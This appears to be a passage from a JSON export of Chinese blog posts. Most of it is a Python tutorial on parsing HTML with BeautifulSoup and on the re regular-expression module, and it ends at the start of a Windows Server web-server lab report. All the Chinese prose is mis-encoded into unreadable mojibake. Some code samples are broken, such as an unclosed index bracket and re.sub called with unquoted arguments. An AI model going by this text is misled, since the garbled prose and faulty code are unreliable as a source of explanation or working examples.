å¯¹è±¡æœ¬èº«æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒçš„ name å³ä¸º [document] \nprint(bs.name) # [document]\n\n# head #å¯¹äºå…¶ä»–å†…éƒ¨æ ‡ç­¾ï¼Œè¾“å‡ºçš„å€¼ä¾¿ä¸ºæ ‡ç­¾æœ¬èº«çš„åç§°\nprint(bs.head.name)  # head\n\n# è·å–aæ ‡ç­¾é‡Œçš„æ‰€æœ‰å±æ€§ï¼Œæ‰“å°è¾“å‡ºæ¥ï¼Œå¾—åˆ°çš„ç±»å‹æ˜¯ä¸€ä¸ªå­—å…¸ã€‚ \nprint(bs.a.attrs) \n# {'class': ['mnav'], 'href': 'http://news.baidu.com', 'name': 'tj_trnews'}\n\n#è¿˜å¯ä»¥åˆ©ç”¨getæ–¹æ³•ï¼Œä¼ å…¥å±æ€§çš„åç§°ï¼ŒäºŒè€…æ˜¯ç­‰ä»·çš„\nprint(bs.a['class']) # ç­‰ä»· bs.a.get('class') \n\n# å¯ä»¥å¯¹è¿™äº›å±æ€§å’Œå†…å®¹ç­‰ç­‰è¿›è¡Œä¿®æ”¹\nbs.a['class'] = \"newClass\"\nprint(bs.a) \n\n# è¿˜å¯ä»¥å¯¹è¿™ä¸ªå±æ€§è¿›è¡Œåˆ é™¤\ndel bs.a['class'] \nprint(bs.a)\n```\n\n##### 3.2.2 NavigableString\n\n> æ—¢ç„¶æˆ‘ä»¬å·²ç»å¾—åˆ°äº†æ ‡ç­¾çš„å†…å®¹ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¦æƒ³è·å–æ ‡ç­¾å†…éƒ¨çš„æ–‡å­—æ€ä¹ˆåŠå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œç”¨ .string å³å¯ï¼Œä¾‹å¦‚\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#è·å–titleæ ‡ç­¾ä¸­çš„å­—ç¬¦ä¸²\nprint(bs.title.string) #ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ \n\n# ç±»å‹\nprint(type(bs.title.string)) \n#<class 'bs4.element.NavigableString'>\n\n```\n\n##### 3.3.3 BeautifulSoup\n\n> BeautifulSoupå¯¹è±¡è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªæ–‡æ¡£çš„å†…å®¹ã€‚å¤§éƒ¨åˆ†æ—¶å€™ï¼Œå¯ä»¥æŠŠå®ƒå½“ä½œ Tag å¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ Tagï¼Œæˆ‘ä»¬å¯ä»¥åˆ†åˆ«è·å–å®ƒçš„ç±»å‹ï¼Œåç§°ï¼Œä»¥åŠå±æ€§ï¼Œä¾‹å¦‚ï¼š\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#è·å–æ•´ä¸ªæ–‡æ¡£\nprint(bs)\n\nprint(type(bs)) #<class 'bs4.BeautifulSoup'>\n```\n\n##### 3.3.4 Comment\n\n> Comment å¯¹è±¡æ˜¯ä¸€ä¸ªç‰¹æ®Šç±»å‹çš„ NavigableString å¯¹è±¡ï¼Œå…¶è¾“å‡ºçš„å†…å®¹ä¸åŒ…æ‹¬æ³¨é‡Šç¬¦å·ã€‚\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nprint(bs.a)\n# aæ ‡ç­¾å¦‚ä¸‹ï¼š\n# <a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"><!--æ–°é—»--></a>\n\nprint(bs.a.string) # æ–°é—»  #ä¸ä¼šè¾“å‡ºä¸Šé¢aæ ‡ç­¾ä¸­çš„æ³¨é‡Šç¬¦å·\n\nprint(type(bs.a.string)) \n# <class 'bs4.element.Comment'>\n```\n\n#### 3.3 éå†æ–‡æ¡£æ•°\n\n **.contentsï¼šè·å–Tagçš„æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œè¿”å›ä¸€ä¸ªlist**\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nprint(bs.head.contents)  #è·å–headä¸‹é¢çš„æ‰€æœ‰ç›´æ¥å­èŠ‚ç‚¹ï¼Œè¿”å›åˆ—è¡¨ \nprint(bs.head.contents[1 #ç”¨åˆ—è¡¨ç´¢å¼•æ¥è·å–å®ƒçš„æŸä¸€ä¸ªå…ƒç´ \n```\n\n **.childrenï¼šè·å–Tagçš„æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨**\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nfor child in  bs.body.children:\n\tprint(child)\n```\n\n| .descendants           | è·å–Tagçš„æ‰€æœ‰å­å­™èŠ‚ç‚¹                                        |\n| ---------------------- | ------------------------------------------------------------ |\n| **.strings**           | **å¦‚æœTagåŒ…å«å¤šä¸ªå­—ç¬¦ä¸²ï¼Œå³åœ¨å­å­™èŠ‚ç‚¹ä¸­æœ‰å†…å®¹ï¼Œå¯ä»¥ç”¨æ­¤è·å–ï¼Œè€Œåè¿›è¡Œéå†** |\n| **.stripped_strings**  | **ä¸stringsç”¨æ³•ä¸€è‡´ï¼Œåªä¸è¿‡å¯ä»¥å»é™¤æ‰é‚£äº›å¤šä½™çš„ç©ºç™½å†…å®¹**    |\n| **.parent**            | **è·å–Tagçš„çˆ¶èŠ‚ç‚¹**                                          |\n| **.parents**           | **é€’å½’å¾—åˆ°çˆ¶è¾ˆå…ƒç´ çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨**               |\n| **.previous_sibling**  | **è·å–å½“å‰Tagçš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹ï¼Œå±æ€§é€šå¸¸æ˜¯å­—ç¬¦ä¸²æˆ–ç©ºç™½ï¼ŒçœŸå®ç»“æœæ˜¯å½“å‰æ ‡ç­¾ä¸ä¸Šä¸€ä¸ªæ ‡ç­¾ä¹‹é—´çš„é¡¿å·å’Œæ¢è¡Œç¬¦** |\n| **.next_sibling**      | **è·å–å½“å‰Tagçš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå±æ€§é€šå¸¸æ˜¯å­—ç¬¦ä¸²æˆ–ç©ºç™½ï¼ŒçœŸæ˜¯ç»“æœæ˜¯å½“å‰æ ‡ç­¾ä¸ä¸‹ä¸€ä¸ªæ ‡ç­¾ä¹‹é—´çš„é¡¿å·ä¸æ¢è¡Œç¬¦** |\n| **.previous_siblings** | **è·å–å½“å‰Tagçš„ä¸Šé¢æ‰€æœ‰çš„å…„å¼ŸèŠ‚ç‚¹ï¼Œè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨**          |\n| **.next_siblings**     | **è·å–å½“å‰Tagçš„ä¸‹é¢æ‰€æœ‰çš„å…„å¼ŸèŠ‚ç‚¹ï¼Œè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨**          |\n| **.previous_element**  | **è·å–è§£æè¿‡ç¨‹ä¸­ä¸Šä¸€ä¸ªè¢«è§£æçš„å¯¹è±¡(å­—ç¬¦ä¸²æˆ–tag)ï¼Œå¯èƒ½ä¸previous_siblingç›¸åŒï¼Œä½†é€šå¸¸æ˜¯ä¸ä¸€æ ·çš„** |\n| **.next_element**      | **è·å–è§£æè¿‡ç¨‹ä¸­ä¸‹ä¸€ä¸ªè¢«è§£æçš„å¯¹è±¡(å­—ç¬¦ä¸²æˆ–tag)ï¼Œå¯èƒ½ä¸next_siblingç›¸åŒï¼Œä½†é€šå¸¸æ˜¯ä¸ä¸€æ ·çš„** |\n| **.previous_elements** | **è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œå¯ä»¥å‘å‰è®¿é—®æ–‡æ¡£çš„è§£æå†…å®¹**               |\n| **.next_elements**     | **è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œå¯ä»¥å‘åè®¿é—®æ–‡æ¡£çš„è§£æå†…å®¹**               |\n| **.has_attr**          | **åˆ¤æ–­Tagæ˜¯å¦åŒ…å«å±æ€§**                                      |\n\nè¯¦æƒ…è¯·çœ‹ä¸­æ–‡æ–‡æ¡£ï¼š[Beautiful Soup 4.4.0 æ–‡æ¡£](https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/)\n\n#### 3.4 æ–‡æ¡£çš„æœç´¢find_all()\n\n##### nameå‚æ•°\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#å­—ç¬¦ä¸²è¿‡æ»¤ï¼šä¼šæŸ¥æ‰¾ä¸å­—ç¬¦ä¸²å®Œå…¨åŒ¹é…çš„å†…å®¹\nt_list = bs.find_all(\"a\")\nt_list = bs.find_all(\"title\")\nprint(t_list)\n\n#æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼šå¦‚æœä¼ å…¥çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆBeautifulSoup4ä¼šé€šè¿‡search()æ¥åŒ¹é…å†…å®¹\nimport re\nt_list = bs.find_all(re.compile(\"a\"))\nprint(t_list)\n```\n##### å‡½æ•°å‚æ•°\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#å®šä¹‰å‡½æ•°ï¼šä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œæ ¹æ®å‡½æ•°çš„è¦æ±‚æ¥æœç´¢\ndef name_is_exists(tag):\n    return tag.has_attr(\"name\")#æœç´¢åŒ…å«nameçš„æ ‡ç­¾\n\nt_list = bs.find_all(name_is_exists)\nfor item in t_list: #æ‰“å°åˆ—è¡¨å†…å®¹\n     print(item)\n```\n\n##### keywordå‚æ•°\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#æœç´¢id=headçš„å†…å®¹\nt_list = bs.find_all(id=\"head\")\nfor item in t_list:\n    print(item)\n    \n#æœç´¢class=manavçš„å†…å®¹    \nt_list = bs.find_all(class_=\"mnav\")\nfor item in t_list: \n     print(item)\n        \n#æœç´¢é“¾æ¥çš„å†…å®¹ \nt_list = bs.find_all(href=\"http://news.baidu.com\")\nfor item in t_list: \n     print(item)\n```\n\n##### textå‚æ•°\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nimport re\n#t_list = bs.find_all(text=\"hao123\")\n#t_list = bs.find_all(text=[\"hao123\",\"è´´å§\",\"åœ°å›¾\"])\nt_list = bs.find_all(text=re.compile(\"\\d\"))#æŸ¥æ‰¾åŒ…å«æ•°å­—çš„æ–‡æœ¬\nfor item in t_list: \n     print(item)\n```\n\n##### limit å‚æ•°\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nt_list = bs.find_all(\"a\",limit=3)\nfor item in t_list: \n     print(item)\n```\n\n#### 3.5 cssé€‰æ‹©å™¨\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#é€šè¿‡æ ‡ç­¾æ¥æŸ¥æ‰¾\nt_list = bs.select('title')   \n\n#é€šè¿‡ç±»åï¼ˆ.è¡¨ç¤ºç±»ï¼‰æ¥æŸ¥æ‰¾\nt_list = bs.select('.mnav')\n\n#é€šè¿‡idï¼ˆ#è¡¨ç¤ºidï¼‰æ¥æŸ¥æ‰¾\nt_list = bs.select('#u1')\n\n#é€šè¿‡å±æ€§æ¥æŸ¥æ‰¾ æŸ¥æ‰¾aæ ‡ç­¾ä¸­class=briçš„å†…å®¹\nt_list = bs.select(\"a[class='bri']\")   \n\n#é€šè¿‡çˆ¶å­æ ‡ç­¾æ¥æŸ¥æ‰¾\nt_list=bs.select(\"head > title\")   \n\n#é€šè¿‡å…„å¼Ÿæ ‡ç­¾æ¥æŸ¥æ‰¾\nt_list=bs.select(\".mnav ~ .bri\")   \n\nfor item in t_list: #æ‰“å°åˆ—è¡¨å†…å®¹\n       print(item)\nprint(t_list[0].get_text()) #æ‹¿åˆ°t_listä¸­çš„æ–‡æœ¬\n```\n\n### 4 reåº“\n\n> æ­£åˆ™è¡¨è¾¾å¼(Regular Expression)é€šå¸¸è¢«ç”¨æ¥`åŒ¹é…`ã€`æ£€ç´¢`ã€`æ›¿æ¢`å’Œ`åˆ†å‰²`é‚£äº›ç¬¦åˆæŸä¸ªæ¨¡å¼(è§„åˆ™)çš„æ–‡æœ¬ã€‚\n\n#### 4.1 æ­£åˆ™è¡¨è¾¾å¼å¸¸ç”¨æ“ä½œç¬¦\n\n| æ“ä½œç¬¦ | è¯´æ˜                              | å®ä¾‹                                 |\n| ------ | --------------------------------- | ------------------------------------ |\n| .      | è¡¨ç¤ºé™¤ \"\\n\" ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚  |                                      |\n| [ ]    | å®‡ç¬¦é›†ï¼Œå¯¹å•ä¸ªå­—ç¬¦ç»™å‡ºå–å€¼èŒƒå›´    | [abc]è¡¨ç¤ºa,b,c;[a-z]è¡¨ç¤ºaåˆ°zå•ä¸ªå­—ç¬¦ |\n| [^ ]   | éå­—ç¬¦é›†,å¯¹å•ä¸ªå­—ç¬¦æ°ç»™å‡ºæ’é™¤èŒƒå›´ | [^abc]è¡¨ç¤ºéaæˆ–ébæˆ–cçš„å•ä¸ªå­—ç¬¦      |\n| *      | å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–æ— é™æ¬¡æ‰©å±•         | abc* è¡¨ç¤ºabã€abcã€abccã€abccç­‰       |\n| +      | å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡æ‰©å±•         | abc+ è¡¨ç¤ºabcã€abccã€abccç­‰           |\n| ?      | å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ”»æ‰©å±•            | abc? è¡¨ç¤ºabã€abc                     |\n| \\|     | å·¦å³è¡¨è¾¾å¼ä»»æ„ä¸€ä¸ª                | abc\\|def  è¡¨ç¤ºabcã€def               |\n| {m}    | æ‰©å±•å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡                 | ab(2}cè¡¨ç¤ºabbc                       |\n| {m,n}  | æ‰©å±•å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡(å«n)         | ab{1,2}cè¡¨ç¤ºabcã€abbc                |\n| ^      | åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´                    | ^abcè¡¨ç¤ºabcä¸”åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´      |\n| $      | åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾                    | abc$è¡¨ç¤ºabcä¸”åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“å°¾      |\n| ( )    | åˆ†ç»„æ ‡è®°,å†…éƒ¨åªèƒ½ä½¿ç”¨\\|æ“ä½œç¬¦     | (abc)è¡¨ç¤ºabc ,(abc\\|def)è¡¨ç¤ºabcã€def |\n| \\d     | æ•°å­—,ç­‰ä»·äº[0-9]                  |                                      |\n| \\w     | å•è¯å­—ç¬¦,ç­‰ä»·äº[A-Za-z0-9_ ]      |                                      |\n\n#### 4.2 reåº“å¸¸ç”¨å‡½æ•°\n\n| å‡½æ•°           | è¯´æ˜                                                         |\n| -------------- | ------------------------------------------------------------ |\n| re.compile()   | è¿”å›ä¸€ä¸ªæ­£åˆ™å¯¹è±¡çš„æ¨¡å¼ã€‚                                     |\n| re. search()   | åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœç´ åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªä½ç½® ,è¿”å›matchå¯¹è±¡  |\n| re. match()    | ä»ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®èµ·åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼,è¿”å›matchå¯¹è±¡         |\n| re. findall()  | æœç´¢å­—ç¬¦ä¸²,ä»¥åˆ—è¡¨ç±»å‹è¿”å›å…¨éƒ¨èƒ½åŒ¹é…çš„å­ä¸²                    |\n| re. split()    | å°†ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ç…§æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç»“æœè¿›è¡Œåˆ†å‰²,è¿”å›åˆ—è¡¨ç±»å‹      |\n| re. finditer() | æ“…ç´¢å­—ç¬¦ä¸²ã€‚è¿”å›ä¸€ä¸ªåŒ¹é…ç»“æœçš„è¿­ä»£ç±»å‹ï¼Œæ¯ä¸ªé€‰ä»£å…ƒç´ æ˜¯matchå¯¹è±¡ |\n| re. sub()      | åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ™®æ¢æ‰€æœ‰åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„å­ä¸²,è¿”å›æ›¿æ¢åçš„å­—ç¬¦ç”³ |\n\n##### 4.2.1 compile()\n\næ ¼å¼ï¼š`re.compile(pattern[,flags=0])`\n\n- `pattern`: ç¼–è¯‘æ—¶ç”¨çš„è¡¨è¾¾å¼å­—ç¬¦ä¸²ã€‚\n- `flags`: ç¼–è¯‘æ ‡å¿—ä½ï¼Œç”¨äºä¿®æ”¹æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šre.Iã€re.Sç­‰\n\n```python\nimport re\npat=re.compile(\"A\")\nm=pat.search(\"CBA\") #ç­‰ä»·äº re.search(A,CBA)\nprint(m)#<re.Match object; span=(2, 3), match='A'>  è¡¨ç¤ºåŒ¹é…åˆ°äº†\n\nm=pat.search(\"CBD\")\nprint(m) Â #None è¡¨ç¤ºæ²¡åŒ¹é…åˆ°\n```\n\n##### 4.2.2 search()\n\n- åœ¨å­—ç¬¦ä¸²ä¸­å¯»æ‰¾æ¨¡å¼\n\n- æ ¼å¼ï¼š`re.search(pattern, string[, flags=0])`\n\n- re.searchå‡½æ•°ä¼šåœ¨å­—ç¬¦ä¸²å†…æŸ¥æ‰¾æ¨¡å¼åŒ¹é…,åªè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ç„¶åè¿”å›ï¼Œå¦‚æœå­—ç¬¦ä¸²æ²¡æœ‰åŒ¹é…ï¼Œåˆ™è¿”å›Noneã€‚\n\n```python\n  import re\n  m = re.search(\"asd\" , \"ASDasd\" )\n  print(m)# <_sre.SRE_Match object at 0xb72cd6e8>  #åŒ¹é…åˆ°äº†ï¼Œè¿”å›MatchObjectï¼ˆTrueï¼‰\n  \n  \n  m = re.search(\"asd\" , \"ASDASD\" )\n  print(m) Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  #æ²¡æœ‰åŒ¹é…åˆ°ï¼Œè¿”å›Noneï¼ˆFalseï¼‰\n```\n##### 4.2.3 match()\n\n- åœ¨å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æ¨¡å¼\n- æ ¼å¼ï¼š`re.match(pattern, string[, flags=0])`\n\n```python\nimport re\npat=re.compile( \"a\" ) \nprint(pat.match( \"Aasd\" )) #è¾“å‡ºNone\n\npat=re.compile( \"A\" ) \nprint(pat.match( \"Aasd\" )) #è¾“å‡º<_sre.SRE_Match object; span=(0, 1), match='A'>\n```\n\n- æ³¨ï¼šmatchå’Œsearchä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œå°±æ˜¯ä¸€ä¸ªmatch objectå¯¹è±¡ï¼Œè€Œmatch objectå¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ï¼š\n\n  - group() è¿”å›è¢« RE åŒ¹é…çš„å­—ç¬¦ä¸²\n  \n  - start() è¿”å›åŒ¹é…å¼€å§‹çš„ä½ç½®\n  \n  - end() è¿”å›åŒ¹é…ç»“æŸçš„ä½ç½®\n  \n  - span() è¿”å›ä¸€ä¸ªå…ƒç»„åŒ…å«åŒ¹é… (å¼€å§‹,ç»“æŸ) çš„ä½ç½®\n  \n\n##### 4.2.3  findall()\n\n- åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…é¡¹\n\n- æ ¼å¼ï¼š`re.findall(pattern, string[, flags=0])`\n\n```python\n  import re\n  #å‰é¢å­—ç¬¦ä¸²æ˜¯è§„åˆ™ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ï¼Œåé¢å­—ç¬¦ä¸²æ˜¯è¢«æ ¡éªŒçš„å­—ç¬¦ä¸²\n  print(re.findall(\"a\",\"ASDaDFGAa\"))      \n  #[a,a] \t#åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²\n  \n  p = re.compile(r'\\d+')\n  print(p.findall('o1n2m3k4'))\n  #æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\n  #['1', '2', '3', '4']\n  \n  print(re.findall(\"[A-Z]\",\"ASDaDFGAa\"))\n  #[ A , S , D , D , F , G , A ] \n  \n  print(re.findall(\"[A-Z]+\",\"ASDaDFGAa\"))\n  #[ ASD , DFGA ]\n  \n  pat = re.compile(\"[A-Za-z]\")\n  print(pat.findall(\"ASDcDFGAa\"))\n  #[ A , S , D , c , D , F , G , A , a ]\n```\n\n##### 4.2.4 re. split()\n\n- æŒ‰ç…§èƒ½å¤ŸåŒ¹é…çš„å­ä¸²å°†stringåˆ†å‰²åè¿”å›åˆ—è¡¨ã€‚\n\n- å¯ä»¥ä½¿ç”¨re.splitæ¥åˆ†å‰²å­—ç¬¦ä¸²ï¼Œå¦‚ï¼šre.split(r'\\s+', text)ï¼›å°†å­—ç¬¦ä¸²æŒ‰ç©ºæ ¼åˆ†å‰²æˆä¸€ä¸ªå•è¯åˆ—è¡¨ã€‚\n\n- æ ¼å¼ï¼š`re.split(pattern, string[, maxsplit])`\n\n  - `maxsplit`: ç”¨äºæŒ‡å®šæœ€å¤§åˆ†å‰²æ¬¡æ•°ï¼Œä¸æŒ‡å®šå°†å…¨éƒ¨åˆ†å‰²ã€‚\n\n```python\nprint(re.split('\\d+','one1two2three3four4five5'))\n\n# æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\n# ['one', 'two', 'three', 'four', 'five', '']\n```\n\n##### 4.2.5 finditer()\n\n- æœç´¢stringï¼Œè¿”å›ä¸€ä¸ªé¡ºåºè®¿é—®æ¯ä¸€ä¸ªåŒ¹é…ç»“æœï¼ˆMatchå¯¹è±¡ï¼‰çš„è¿­ä»£å™¨ã€‚\n\n- æ‰¾åˆ° RE åŒ¹é…çš„æ‰€æœ‰å­ä¸²ï¼Œå¹¶æŠŠå®ƒä»¬ä½œä¸ºä¸€ä¸ªè¿­ä»£å™¨è¿”å›ã€‚\n\n- æ ¼å¼ï¼š`re.finditer(pattern, string[, flags=0])`\n\n  ```python\n  import re\n  iter = re.finditer(r'\\d+','12 drumm44ers drumming, 11 ... 10 ...')\n  for i in iter:\n      print(i)\n      print(i.group())\n      print(i.span())\n  \n  '''\n  # æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\n  <_sre.SRE_Match object; span=(0, 2), match='12'>\n  12\n  (0, 2)\n  <_sre.SRE_Match object; span=(8, 10), match='44'>\n  44\n  (8, 10)\n  <_sre.SRE_Match object; span=(24, 26), match='11'>\n  11\n  (24, 26)\n  <_sre.SRE_Match object; span=(31, 33), match='10'>\n  10\n  (31, 33)\n  '''\n  ```\n\n  \n\n##### 4.2.6 sub()\n\n- æ ¼å¼ï¼š`re.sub(pattern, repl, string, count)`\n\n- ç”¨replæ›¿æ¢ patternåŒ¹é…é¡¹\n\n  ```python\n  import re\n  print(re.sub(a,A,abcasd)) #æ‰¾åˆ°aç”¨Aæ›¿æ¢ï¼Œåé¢è§å’Œgroupçš„é…åˆä½¿ç”¨\n  #AbcAsd  #ç¬¬å››ä¸ªå‚æ•°æŒ‡æ›¿æ¢ä¸ªæ•°ã€‚é»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºæ¯ä¸ªåŒ¹é…é¡¹éƒ½æ›¿æ¢ã€‚\n  \n  text = \"JGood is a handsome boy, he is cool, clever, and so on...\"\n  print(re.sub(r'\\s+', '-', text)) #\\s:ç©ºæ ¼\n  #JGood-is-a-handsome-boy,-he-is-cool,-clever,-and-so-on...\n  ```\n\n  \n\n#### 4.3 æ¨¡å¼ä¿®æ­£ç¬¦\n\n> æ‰€è°“æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå³å¯ä»¥åœ¨ä¸æ”¹å˜æ­£åˆ™è¡¨è¾¾å¼çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ¨¡å¼ä¿®æ­£ç¬¦æ”¹å˜æ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰ï¼Œä»è€Œå®ç°ä¸€äº›åŒ¹é…ç»“æœçš„è°ƒæ•´ç­‰åŠŸèƒ½ã€‚\n\n| ä¿®é¥°ç¬¦ | æè¿°                                                         |\n| ------ | ------------------------------------------------------------ |\n| re.I   | ä½¿åŒ¹é…å¯¹å¤§å°å†™ä¸æ•æ„Ÿ                                         |\n| re.L   | åšæœ¬åœ°åŒ–è¯†åˆ«ï¼ˆlocale-awareï¼‰åŒ¹é…                             |\n| re.M   | å¤šè¡ŒåŒ¹é…ï¼Œå½±å“ ^ å’Œ $                                        |\n| re.S   | ä½¿ . åŒ¹é…åŒ…æ‹¬æ¢è¡Œåœ¨å†…çš„æ‰€æœ‰å­—ç¬¦                              |\n| re.U   | æ ¹æ®Unicodeå­—ç¬¦é›†è§£æå­—ç¬¦ã€‚è¿™ä¸ªæ ‡å¿—å½±å“ \\w, \\W, \\b, \\B.      |\n| re.X   | è¯¥æ ‡å¿—é€šè¿‡ç»™äºˆä½ æ›´çµæ´»çš„æ ¼å¼ä»¥ä¾¿ä½ å°†æ­£åˆ™è¡¨è¾¾å¼å†™å¾—æ›´æ˜“äºç†è§£ã€‚ |\n\n```python\nimport re\nstring = \"Python\"\npat = \"pyt\"\nrst = re.search(pat,string,re.I) # ç¬¬ä¸‰ä¸ªå‚æ•°\nprint(rst)#<_sre.SRE_Match object; span=(0, 3), match='Pyt'>\n```\n\n","tags":["çˆ¬è™«"],"categories":["Python"]},{"title":"WebæœåŠ¡å™¨é…ç½®ä¸ç®¡ç†","url":"/posts/61907.html","content":"\n## ä¸€ã€å®éªŒç¯å¢ƒ\n\n1.\tæ“ä½œç³»ç»Ÿï¼šWindowsç³»ç»Ÿã€é˜¿é‡Œäº‘Windows Server 2016\n2.\tå®éªŒè®¾å¤‡ï¼šPCæœº\n\n## äºŒã€ å®éªŒå†…å®¹\n\nä»»åŠ¡ 1ï¼šWebæœåŠ¡å™¨çš„å®‰è£…\nä»»åŠ¡ 2ï¼šåˆ›å»ºWebç«™ç‚¹å¹¶å®ç°å¤–ç½‘è®¿é—®\nä»»åŠ¡ 3ï¼šé…ç½®å®¢æˆ·ç«¯è®¿é—®Webç«™ç‚¹\nä»»åŠ¡ 4ï¼šåŸºäºIPåœ°å€çš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\nä»»åŠ¡5ï¼šåŸºäºä¸»æœºåçš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\nä»»åŠ¡6ï¼šåŸºäºç«¯å£å·çš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\nä»»åŠ¡7ï¼šåŸºäºè™šæ‹Ÿç›®å½•çš„å¤šä¸ªç«™ç‚¹çš„åˆ›å»º\nä»»åŠ¡8ï¼šé€šè¿‡FTPæ›´æ–°Webç«™ç‚¹\n\n## ä¸‰ã€å®éªŒæ­¥éª¤ä¸ç»“æœ\n\n### 1.WebæœåŠ¡å™¨çš„å®‰è£…\n\n**i.**\tæ‰“å¼€ã€æœåŠ¡å™¨ç®¡ç†å™¨ã€‘ï¼Œå•å‡»ã€æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½ã€‘é€‰é¡¹ã€‚\n![](https://i.loli.net/2020/03/21/KC41y3UIPqbJG56.png)\n**ii.**\tåœ¨ã€æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½å‘å¯¼ã€‘ä¸­ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚ç„¶åï¼Œåœ¨ã€å®‰è£…ç±»å‹ã€‘ï¼Œé€‰æ‹©ã€åŸºäºè§’è‰²æˆ–åŸºäºåŠŸèƒ½çš„å®‰è£…ã€‘ï¼Œå•å‡»ã€ä¸‹ä¸€æ­¥ã€‘æŒ‰é’®ã€‚\n![](https://i.loli.net/2020/03/21/h1IVKsPgxafJYbE.png)\n**iii.**\tåœ¨ã€æœåŠ¡å™¨é€‰æ‹©ã€‘ä¸­ï¼Œé€‰æ‹©ã€ä»æœåŠ¡å™¨æ± 